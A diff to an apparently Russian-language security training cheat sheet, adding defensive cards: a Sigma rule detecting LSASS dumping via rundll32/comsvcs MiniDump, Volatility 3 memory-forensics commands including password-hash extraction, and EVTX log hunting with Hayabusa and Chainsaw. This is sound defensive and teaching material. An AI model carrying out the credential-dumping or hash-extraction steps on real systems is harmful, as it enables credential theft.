+    category: process_creation
+    product: windows
+detection:
+    selection:
+        Image|endswith: '\rundll32.exe'
+        CommandLine|contains|all:
+            - 'comsvcs'
+            - 'MiniDump'
+    condition: selection
+level: critical
+tags:
+    - attack.credential_access
+    - attack.t1003.001
+
+# 2. Трансляция правила Sigma в запрос для SIEM (Splunk / Elastic) через sigmac:
+sigma convert -t splunk -p sysmon rule_lsass_dump.yml
+sigma convert -t es-qs -p sysmon rule_lsass_dump.yml</pre>
+          <p class="cmd-note"><b>Sigma</b> — международный формат описания детектов для журналов событий (Event Logs). Позволяет аналитикам SOC описать сигнатуру подозрительного поведения один раз и автоматически экспортировать ее в Splunk, Elasticsearch, Graylog или Microsoft Sentinel.</p>
+          <div class="tags"><span class="tag-link" data-tag="defense">#defense</span><span class="tag-link" data-tag="soc">#soc</span><span class="tag-link" data-tag="forensics">#forensics</span></div>
+        </article>
+
+        <article class="card cmd-card" id="cmd-memory-volatility" data-tags="defense forensics memory dfir">
+          <div class="cmd-head">
+            <h3>Memory Forensics: Volatility 3 — анализ дампов оперативной памяти</h3><span class="diff diff-pro">Продвинутый</span>
+          </div>
+          <pre class="code"># 1. Анализ дерева процессов (поиск подозрительных родителей, напр. cmd.exe под w3wp.exe):
+python3 vol.py -f memory.raw windows.pstree
+
+# 2. Детект скрытых инъекций shellcode и DLL Injection (RWX-память):
+python3 vol.py -f memory.raw windows.malfind
+
+# 3. Анализ сетевых соединений в момент снятия дампа (C2-коннекты):
+python3 vol.py -f memory.raw windows.netscan
+
+# 4. Выгрузка подозрительного бинарника или внедренной секции из памяти на диск:
+python3 vol.py -f memory.raw windows.dumpfiles --pid 1344
+
+# 5. Извлечение хэшей паролей из реестра SAM и кеша LSA в памяти:
+python3 vol.py -f memory.raw windows.hashdump</pre>
+          <p class="cmd-note"><b>Volatility 3</b> — главный инструмент криминалистического анализа дампов оперативной памяти RAM. Плагин <code>malfind</code> находит вредоносный код, работающий напрямую в памяти без сохранения файлов на жестком диске (Fileless Malware).</p>
+          <div class="tags"><span class="tag-link" data-tag="defense">#defense</span><span class="tag-link" data-tag="forensics">#forensics</span></div>
+        </article>
+
+        <article class="card cmd-card" id="cmd-evtx-hayabusa" data-tags="defense logs soc dfir">
+          <div class="cmd-head">
+            <h3>Парсинг Windows EVTX через Hayabusa &amp; Chainsaw (Ключевые Event ID)</h3><span class="diff diff-pro">Продвинутый</span>
+          </div>
+          <pre class="code"># 1. Сверхбыстрый парсинг директории с журналами EVTX через Hayabusa:
+./hayabusa-x86_64-pc-windows-msvc.exe search-timeline -d /logs/evtx/ -o timeline.csv
+./hayabusa-x86_64-pc-windows-msvc.exe logon-summary -d /logs/evtx/
+
+# 2. Охота за атаками с помощью Chainsaw по базе правил Sigma:
+./chainsaw hunt /logs/evtx/ -s /rules/sigma/ --mapping mappings/sigma-event-logs-all.yml
+
+# 3. Главные Event ID для мониторинга и расследования в Windows Security Log:
+# ID 4624 — Успешный вход в систему (LogonType: 2-Интерактивно, 3-Сеть/SMB, 10-RDP)
+# ID 4625 — Неудачная попытка аутентификации (брутфорс, спреинг)
+# ID 4672 — Назначение спецпривилегий (SeDebugPrivilege, SeImpersonatePrivilege)
+# ID 4768 — Запрос Kerberos TGT билета (выявление AS-REP Roasting)
+# ID 4769 — Запрос сервисного Kerberos TGS (выявление Kerberoasting)
+# ID 7045 — Создание новой службы (System Log — lateral movement через PsExec)
+# ID 4104 — PowerShell Script Block Logging (запись всего выполненного кода PS)</pre>
+          <p class="cmd-note"><b>Hayabusa</b> и <b>Chainsaw</b> написаны на Rust и анализируют гигабайты журналов событий Windows за считанные секунды, автоматически сопоставляя найденные аномалии с тактиками матрицы MITRE ATT&amp;CK.</p>
+          <div class="tags"><span class="tag-link" data-tag="defense">#defense</span><span class="tag-link" data-tag="logs">#logs</span><span class="tag-link" data-tag="soc">#soc</span></div>
+        </article>
+      </section>
+
       <!--SEC-tools-->
       <section class="block" id="tools">
-        <div class="sec-head"><span class="sec-num">07</span>
+        <div class="sec-head"><span class="sec-num">11</span>
           <h2 class="sec-title">Полезные инструменты</h2>
         </div>
         <p class="sec-sub">Ящик с инструментами: что для чего, когда брать.</p>
@@ -1255,7 +1694,7 @@ yara -r -s webshell_detector.yar /var/www/html/</pre>
 
       <!--SEC-oneliners-->
       <section class="block" id="oneliners">
-        <div class="sec-head"><span class="sec-num">08</span>
+        <div class="sec-head"><span class="sec-num">12</span>
           <h2 class="sec-title">Быстрые шпаргалки / One-liners</h2>
         </div>
         <p class="sec-sub">Мощные однострочники. Копируй и применяй в своих лабораториях.</p>
@@ -1410,7 +1849,7 @@ yara -r -s webshell_detector.yar /var/www/html/</pre>
 
       <!--SEC-sandbox-->
       <section class="block" id="sandbox">
-        <div class="sec-head"><span class="sec-num">09</span>
+        <div class="sec-head"><span class="sec-num">13</span>
           <h2 class="sec-title">Песочница: терминал-эмулятор</h2>
         </div>
         <p class="sec-sub">Безопасный тренажёр: команды выполняются локально в браузере с фейковым выводом. Ничего не
@@ -1480,7 +1919,7 @@ yara -r -s webshell_detector.yar /var/www/html/</pre>
 
       <!--SEC-scenario-->
       <section class="block" id="scenario">
-        <div class="sec-head"><span class="sec-num">10</span>
+        <div class="sec-head"><span class="sec-num">14</span>
           <h2 class="sec-title">Сквозной сценарий: путь атаки глазами атакующего и защитника</h2>
         </div>
         <p class="sec-sub">Учебный пример на вымышленном сервере <code>shop.example.com (192.0.2.10)</code>. Каждый шаг
@@ -1580,7 +2019,7 @@ cat /etc/passwd | grep -v nologin   # активные пользователи<
 
       <!--SEC-resources-->
       <section class="block" id="resources">
-        <div class="sec-head"><span class="sec-num">11</span>
+        <div class="sec-head"><span class="sec-num">15</span>
           <h2 class="sec-title">Литература и ресурсы</h2>
         </div>
         <p class="sec-sub">Куда расти дальше: книги, курсы, лаборатории.</p>
